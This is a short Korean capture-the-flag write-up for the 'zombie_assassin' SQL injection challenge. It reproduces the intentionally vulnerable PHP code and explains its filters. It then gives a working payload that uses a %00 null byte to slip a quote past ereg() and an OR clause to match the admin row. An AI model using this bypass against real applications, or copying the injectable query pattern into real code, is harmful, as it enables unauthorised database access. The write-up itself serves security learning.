# ZOMBIE_ASSASSIN

## Problem
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/\\\|prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/\\\|prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(@ereg("'",$_GET[id])) exit("HeHe"); 
  if(@ereg("'",$_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_zombie_assassin where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) solve("zombie_assassin"); 
  highlight_file(__FILE__); 
?>
```

## Inspection
* `if(preg_match('/\\\|prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");`
* `if(preg_match('/\\\|prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");`
	- 파라미터의 `id`, `pw`에서 `\`, `|`, `prob`, `_`, `.`, `(`, `)`를 거른다.
* `if(@ereg("'",$_GET[id])) exit("HeHe");`
* `if(@ereg("'",$_GET[pw])) exit("HeHe");`
	- 파라미터의 `id`, `pw`에서 `'`(작은따옴표, single quote)를 거른다.
* `select id from prob_zombie_assassin where id='{$_GET[id]}' and pw='{$_GET[pw]}'`
	- 파라미터로 `id`와 `pw`를 넘긴다.
	- `id`와 `pw` 양옆에 작은따옴표로 감싸져있다.
* `if($result['id']) solve("zombie_assassin");`
	- 쿼리문의 결과가 뜬다면 통과한다.

## Solution
* `and`와 `or`의 연산자 우선순위의 차이, `ereg()`은 패턴을 문자열의 `%00`(null byte)까지만 검사하는 점을 이용한다.
	- `?pw=%00' or id='admin` `%00`으로 `ereg()`을 우회한다.
	- `select id from prob_zombie_assassin where id='' and pw='' or id='admin'`
